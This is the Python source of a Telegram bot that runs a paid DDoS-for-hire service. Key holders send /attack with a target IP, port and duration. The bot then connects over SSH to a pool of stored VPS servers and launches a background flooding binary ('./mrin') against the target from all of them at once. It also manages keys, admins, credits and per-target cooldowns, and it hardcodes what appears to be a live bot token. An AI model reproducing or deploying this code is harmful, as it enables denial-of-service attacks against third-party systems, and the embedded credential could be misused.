#!/usr/bin/env python3
import telebot
import paramiko
import threading
import time
import json
import os
import uuid
import traceback
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor

# ---------------------------
# Bot Credentials and Setup
# ---------------------------
BOT_TOKEN = '7909374116:AAESmzi6HalD3N_3ZaelAsNKliMJVbU3th0'
BOT_OWNER_ID = 5730843286  # Bot owner's Telegram ID

bot = telebot.TeleBot(BOT_TOKEN)

# ---------------------------
# Persistence File Names
# ---------------------------
ADMIN_IDS_FILE = "admin_ids.json"
VPS_FILE = "vps_servers.json"
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
BLOCKED_USERS_FILE = "blocked_users.json"
LOGS_FILE = "execution_logs.txt"
ADMIN_CREDITS_FILE = "admin_credits.json"

# ---------------------------
# Global Variables
# ---------------------------
# Load additional admin IDs from file (besides the owner)
def load_admin_ids():
    if os.path.exists(ADMIN_IDS_FILE):
        try:
            with open(ADMIN_IDS_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            log_execution(f"Error loading {ADMIN_IDS_FILE}: {e}")
    return []

def save_admin_ids(admin_ids):
    try:
        with open(ADMIN_IDS_FILE, 'w') as f:
            json.dump(admin_ids, f)
    except Exception as e:
        log_execution(f"Error saving {ADMIN_IDS_FILE}: {e}")

admin_ids = load_admin_ids()

# Execution cancellation and logging
running_channels = {}   # Map thread name to its SSH channel
cancel_event = threading.Event()
log_lock = threading.Lock()

# Global attack settings
global_max_duration = 60         # Default max attack duration (seconds)
global_cooldown = 300            # Default cooldown period (seconds) after an attack
attack_cooldowns = {}            # Mapping: target_ip -> cooldown expiry datetime

# ThreadPoolExecutor for parallel tasks
executor = ThreadPoolExecutor(max_workers=10)

# ---------------------------
# Safe Telegram API Helpers
# ---------------------------
def safe_send(chat_id, text, parse_mode="HTML", reply_markup=None):
    try:
        bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        log_execution(f"Error sending message to {chat_id}: {e}")

def safe_reply(message, text, parse_mode="HTML"):
    try:
        bot.reply_to(message, text, parse_mode=parse_mode)
    except Exception as e:
        log_execution(f"Error replying to message from {message.from_user.id}: {e}")

# ---------------------------
# Error Handling Decorator
# ---------------------------
def safe_handler(func):
    def wrapper(message, *args, **kwargs):
        try:
            return func(message, *args, **kwargs)
        except Exception as e:
            error_trace = traceback.format_exc()
            log_execution(f"❌ Error in {func.__name__}: {error_trace}")
            safe_reply(message, f"<b>❌ Error:</b> {str(e)}")
    return wrapper

# ---------------------------
# Logging Utility
# ---------------------------
def log_execution(message_text):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with log_lock:
        with open(LOGS_FILE, 'a') as f:
            f.write(f"[{timestamp}] {message_text}\n")

# ---------------------------
# Generic JSON Persistence Functions
# ---------------------------
def load_json(filename, default):
    if os.path.exists(filename):
        try:
            with open(filename, 'r') as f:
                return json.load(f)
        except Exception as e:
            log_execution(f"Error loading {filename}: {e}")
    return default

def save_json(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f)
    except Exception as e:
        log_execution(f"Error saving {filename}: {e}")

vps_servers = load_json(VPS_FILE, [])
keys = load_json(KEYS_FILE, {})
users = load_json(USERS_FILE, {})
blocked_users = load_json(BLOCKED_USERS_FILE, [])
admin_credits = load_json(ADMIN_CREDITS_FILE, {})

if str(BOT_OWNER_ID) not in admin_credits:
    admin_credits[str(BOT_OWNER_ID)] = {
        "balance": 1000000,
        "history": [{
            "type": "add",
            "amount": 1000000,
            "reason": "Initial credit",
            "timestamp": datetime.now().isoformat()
        }]
    }
    save_json(ADMIN_CREDITS_FILE, admin_credits)

def save_vps_data():
    save_json(VPS_FILE, vps_servers)

def save_keys_data():
    save_json(KEYS_FILE, keys)

def save_users_data():
    save_json(USERS_FILE, users)

def save_blocked_users_data():
    save_json(BLOCKED_USERS_FILE, blocked_users)

def save_admin_credits_data():
    save_json(ADMIN_CREDITS_FILE, admin_credits)

# ---------------------------
# Admin Credits Functions
# ---------------------------
def add_credit(admin_id, amount, reason=""):
    admin_id_str = str(admin_id)
    now = datetime.now().isoformat()
    if admin_id_str not in admin_credits:
        admin_credits[admin_id_str] = {"balance": 0, "history": []}
    admin_credits[admin_id_str]["balance"] += amount
    admin_credits[admin_id_str]["history"].append({
        "type": "add",
        "amount": amount,
        "reason": reason,
        "timestamp": now
    })
    save_admin_credits_data()

def deduct_credit(admin_id, amount, reason=""):
    admin_id_str = str(admin_id)
    now = datetime.now().isoformat()
    if admin_id_str not in admin_credits:
        admin_credits[admin_id_str] = {"balance": 0, "history": []}
    admin_credits[admin_id_str]["balance"] -= amount
    admin_credits[admin_id_str]["history"].append({
        "type": "deduct",
        "amount": amount,
        "reason": reason,
        "timestamp": now
    })
    save_admin_credits_data()

def get_credit_balance(admin_id):
    return admin_credits.get(str(admin_id), {"balance": 0})["balance"]

def get_credit_history(admin_id):
    return admin_credits.get(str(admin_id), {"history": []})["history"]

# ---------------------------
# Remote Command Execution via SSH
# ---------------------------
def execute_command(vps, target_ip, target_port, duration):
    try:
        command = f'nohup ./mrin {target_ip} {target_port} {duration} 900 > /dev/null 2>&1 &'
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=10)
        stdin, stdout, stderr = client.exec_command(command)
        channel = stdout.channel
        thread_name = threading.current_thread().name
        running_channels[thread_name] = channel
        while not channel.exit_status_ready():
            if cancel_event.is_set():
                channel.close()
                break
            time.sleep(1)
        try:
            output = stdout.read().decode('utf-8', errors='replace')
            error_output = stderr.read().decode('utf-8', errors='replace')
        except Exception as read_err:
            output = f"❌ Error reading output: {read_err}"
            error_output = ""
        log_execution(f"📡 Output from {vps['ip']}: {output} {error_output}")
        print(f"📡 Output from {vps['ip']}:\n{output}\n{error_output}")
    except Exception as e:
        log_execution(f"❌ Error connecting to {vps['ip']}: {e}")
        print(f"❌ Error connecting to {vps['ip']}: {e}")
    finally:
        thread_name = threading.current_thread().name
        if thread_name in running_channels:
            del running_channels[thread_name]
        try:
            client.close()
        except Exception:
            pass

# ---------------------------
# Role-based Help Command
# ---------------------------
@bot.message_handler(commands=['help'])
@safe_handler
def send_help(message):
    user_id = message.from_user.id

    owner_commands = [
        "/start - Start the bot",
        "/addvps <ip> <username> <password> - Add a VPS",
        "/removevps <ip> - Remove a VPS",
        "/updatevps <ip> <new_username> <new_password> - Update a VPS",
        "/setduration <seconds> - Set global max attack duration",
        "/setcooldown <seconds> - Set global attack cooldown",
        "/genkey <validity> <max_users> <max_duration> <prefix> - Generate a key",
        "/revoke <key> - Revoke a key",
        "/listkeys - List all keys",
        "/logs - View logs",
        "/blockuser <user_id> - Block a user",
        "/unblockuser <user_id> - Unblock a user",
        "/addadmin <user_id> - Add an admin",
        "/removeadmin <user_id> - Remove an admin",
        "/fullhelp - Show full command list"
    ]

    admin_commands = [
        "/status - Check VPS status",
        "/revoke <key> - Revoke a key",
        "/listkeys - List all keys",
        "/checkcredits - Check your credit balance",
        # Add other admin-level commands here if needed
    ]

    user_commands = [
        "/start - Start the bot",
        "/help - View available commands",
        "/usekey <key> - Register a key",
        "/attack <target_ip> <target_port> <time> - Launch an attack"
    ]

    if user_id == BOT_OWNER_ID:
        available = owner_commands + admin_commands + user_commands
    elif user_id in admin_ids:
        available = admin_commands + user_commands
    else:
        available = user_commands

    help_text = "<b>Available Commands:</b>\n\n"
    for cmd in available:
        help_text += f"✅ {cmd}\n"
    safe_reply(message, help_text)

# ---------------------------
# Owner-only Full Help Command
# ---------------------------
@bot.message_handler(commands=['fullhelp'])
@safe_handler
def full_help(message):
    if message.from_user.id != BOT_OWNER_ID:
        safe_reply(message, "<b>🚫 Not authorized to use /fullhelp!</b>")
        return
    full_help_text = (
        "<b>🔎 Full Command List (Owner):</b>\n\n"
        "<b>Owner-only Commands:</b>\n"
        "• /start - Start the bot\n"
        "• /addvps <ip> <username> <password> - Add a VPS\n"
        "• /removevps <ip> - Remove a VPS\n"
        "• /updatevps <ip> <new_username> <new_password> - Update a VPS\n"
        "• /setduration <seconds> - Set global max attack duration\n"
        "• /setcooldown <seconds> - Set global attack cooldown\n"
        "• /genkey <validity> <max_users> <max_duration> <prefix> - Generate a key\n"
        "• /revoke <key> - Revoke a key\n"
        "• /listkeys - List all keys\n"
        "• /logs - View logs\n"
        "• /blockuser <user_id> - Block a user\n"
        "• /unblockuser <user_id> - Unblock a user\n"
        "• /addadmin <user_id> - Add an admin\n"
        "• /removeadmin <user_id> - Remove an admin\n"
        "\n"
        "<b>Admin-only Commands:</b>\n"
        "• /status - Check VPS status\n"
        "• /checkcredits - Check your credit balance\n"
        "\n"
        "<b>User Commands:</b>\n"
        "• /start - Start the bot\n"
        "• /help - View available commands\n"
        "• /usekey <key> - Register a key\n"
        "• /attack <target_ip> <target_port> <time> - Launch an attack\n"
    )
    safe_reply(message, full_help_text)

# ---------------------------
# Owner-only Admin Management Commands
# ---------------------------
@bot.message_handler(commands=['addadmin'])
@safe_handler
def add_admin(message):
    if message.from_user.id != BOT_OWNER_ID:
        safe_reply(message, "<b>🚫 Not authorized to add admins!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_reply(message, "<b>❓ Usage:</b> /addadmin <user_id>")
        return
    try:
        new_admin = int(command_parts[1])
    except ValueError:
        safe_reply(message, "<b>❌ User ID must be an integer.</b>")
        return
    if new_admin in admin_ids:
        safe_reply(message, "<b>ℹ️ This user is already an admin.</b>")
    else:
        admin_ids.append(new_admin)
        save_admin_ids(admin_ids)
        safe_reply(message, f"<b>✅ User {new_admin} added as admin!</b>")

@bot.message_handler(commands=['removeadmin'])
@safe_handler
def remove_admin(message):
    if message.from_user.id != BOT_OWNER_ID:
        safe_reply(message, "<b>🚫 Not authorized to remove admins!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_reply(message, "<b>❓ Usage:</b> /removeadmin <user_id>")
        return
    try:
        remove_id = int(command_parts[1])
    except ValueError:
        safe_reply(message, "<b>❌ User ID must be an integer.</b>")
        return
    if remove_id not in admin_ids:
        safe_reply(message, "<b>ℹ️ This user is not an admin.</b>")
    else:
        admin_ids.remove(remove_id)
        save_admin_ids(admin_ids)
        safe_reply(message, f"<b>✅ User {remove_id} removed from admin list.</b>")

# ---------------------------
# Owner-only User Blocking Commands
# ---------------------------
@bot.message_handler(commands=['blockuser'])
@safe_handler
def block_user_handler(message):
    if message.from_user.id != BOT_OWNER_ID:
        safe_reply(message, "<b>🚫 Not authorized to block users!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_reply(message, "<b>❓ Usage:</b> /blockuser <user_id>")
        return
    try:
        user_to_block = int(command_parts[1])
    except ValueError:
        safe_reply(message, "<b>❌ User ID must be an integer.</b>")
        return
    if user_to_block not in blocked_users:
        blocked_users.append(user_to_block)
        save_blocked_users_data()
        safe_reply(message, f"<b>✅ User {user_to_block} blocked!</b>")
    else:
        safe_reply(message, "<b>ℹ️ User already blocked.</b>")

@bot.message_handler(commands=['unblockuser'])
@safe_handler
def unblock_user_handler(message):
    if message.from_user.id != BOT_OWNER_ID:
        safe_reply(message, "<b>🚫 Not authorized to unblock users!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_reply(message, "<b>❓ Usage:</b> /unblockuser <user_id>")
        return
    try:
        user_to_unblock = int(command_parts[1])
    except ValueError:
        safe_reply(message, "<b>❌ User ID must be an integer.</b>")
        return
    if user_to_unblock in blocked_users:
        blocked_users.remove(user_to_unblock)
        save_blocked_users_data()
        safe_reply(message, f"<b>✅ User {user_to_unblock} unblocked!</b>")
    else:
        safe_reply(message, "<b>ℹ️ User is not blocked.</b>")

# ---------------------------
# Owner-only Cancel Execution Command
# ---------------------------
@bot.message_handler(commands=['cancel'])
@safe_handler
def cancel_execution_handler(message):
    if message.from_user.id != BOT_OWNER_ID:
        safe_reply(message, "<b>🚫 Not authorized to cancel execution!</b>")
        return
    cancel_event.set()
    for thread_name, channel in list(running_channels.items()):
        try:
            channel.close()
        except Exception:
            pass
    safe_reply(message, "<b>🛑 Cancellation signal sent.</b>")
    time.sleep(2)
    cancel_event.clear()

# ---------------------------
# Attack Command (User-accessible)
# ---------------------------
@bot.message_handler(commands=['attack'])
@safe_handler
def attack_vps(message):
    user_id_str = str(message.from_user.id)
    if user_id_str not in users:
        safe_reply(message, "<b>🚫 Not authorized.</b> Register using /usekey <key>.")
        return
    user_key = users[user_id_str]
    if user_key not in keys:
        safe_reply(message, "<b>❌ Key invalid!</b>")
        return
    key_data = keys[user_key]
    expires_at = datetime.fromisoformat(key_data["expires_at"])
    if datetime.now() > expires_at:
        safe_reply(message, "<b>⏰ Key expired!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_reply(message, "<b>❓ Usage:</b> /attack <target_ip> <target_port> <time>")
        return
    ip = command_parts[1]
    port = command_parts[2]
    try:
        duration = int(command_parts[3])
    except ValueError:
        safe_reply(message, "<b>❌ Duration must be an integer.</b>")
        return
    if duration > global_max_duration:
        safe_reply(message, f"<b>⚠️ Duration exceeds global max duration of {global_max_duration} seconds.</b>")
        return
    now = datetime.now()
    if ip in attack_cooldowns and now < attack_cooldowns[ip]:
        safe_reply(message, f"<b>🚫 This IP is on cooldown until {attack_cooldowns[ip].strftime('%Y-%m-%d %H:%M:%S')}.</b>")
        return
    if duration > key_data["max_duration"]:
        safe_reply(message, f"<b>⚠️ Duration exceeds your key's max duration of {key_data['max_duration']} seconds.</b>")
        return
    if not vps_servers:
        safe_reply(message, "<b>❌ No VPS available for the attack!</b>")
        return
    cancel_event.clear()
    safe_reply(message, f"<b>🔥 Attack Initiated!</b>\nTarget: <code>{ip}:{port}</code>\nDuration: {duration} seconds\nVPS Count: {len(vps_servers)}")
    attack_cooldowns[ip] = now + timedelta(seconds=global_cooldown)
    for vps in vps_servers:
        thread = threading.Thread(target=execute_command, args=(vps, ip, port, duration), daemon=True)
        thread.start()

# ---------------------------
# User Command: Use Key
# ---------------------------
@bot.message_handler(commands=['usekey'])
@safe_handler
def use_key_handler(message):
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_reply(message, "<b>❓ Usage:</b> /usekey <key>")
        return
    provided_key = command_parts[1].strip()
    if provided_key not in keys:
        safe_reply(message, "<b>❌ Invalid key!</b>")
        return
    key_data = keys[provided_key]
    expires_at = datetime.fromisoformat(key_data["expires_at"])
    if datetime.now() > expires_at:
        safe_reply(message, "<b>⏰ Key expired!</b>")
        return
    if len(key_data["used"]) >= key_data["max_users"]:
        safe_reply(message, "<b>⚠️ Key has reached max users!</b>")
        return
    user_id_str = str(message.from_user.id)
    if user_id_str in key_data["used"]:
        safe_reply(message, "<b>ℹ️ You have already registered this key.</b>")
        return
    key_data["used"].append(user_id_str)
    save_keys_data()
    users[user_id_str] = provided_key
    save_users_data()
    safe_reply(message, f"<b>✅ Key accepted!</b> You can attack for {key_data['max_duration']} seconds.")

# ---------------------------
# Admin Credits Commands (Owner-only)
# ---------------------------
@bot.message_handler(commands=['checkcredits'])
@safe_handler
def check_credits_handler(message):
    admin_id = message.from_user.id
    balance = get_credit_balance(admin_id)
    history = get_credit_history(admin_id)
    history_text = "\n".join([f"{item['timestamp']}: {item['type']} {item['amount']} ({item.get('reason','')})" for item in history])
    reply = (f"<b>💳 Your Credit Balance:</b> {balance}\n"
             f"<b>📝 Transaction History:</b>\n<pre>{history_text}</pre>")
    safe_reply(message, reply)

@bot.message_handler(commands=['addcredit'])
@safe_handler
def add_credit_command(message):
    if message.from_user.id != BOT_OWNER_ID:
        safe_reply(message, "<b>🚫 Not authorized to add credits!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_reply(message, "<b>❓ Usage:</b> /addcredit <admin_id> <amount>")
        return
    target_id = command_parts[1]
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_reply(message, "<b>❌ Error:</b> Amount must be an integer.")
        return
    add_credit(target_id, amount, reason="Manual credit addition")
    safe_reply(message, f"<b>✅ Added {amount} credits to admin {target_id}.</b> New balance: {get_credit_balance(target_id)}")

# ---------------------------
# Main Bot Loop with Watchdog
# ---------------------------
if __name__ == '__main__':
    while True:
        try:
            print("🤖 Bot is running...")
            bot.polling(none_stop=True)
        except Exception as e:
            log_execution(f"❌ Bot crashed: {str(e)}")
            print("❌ Bot crashed, restarting in 5 seconds:", e)
            time.sleep(5)
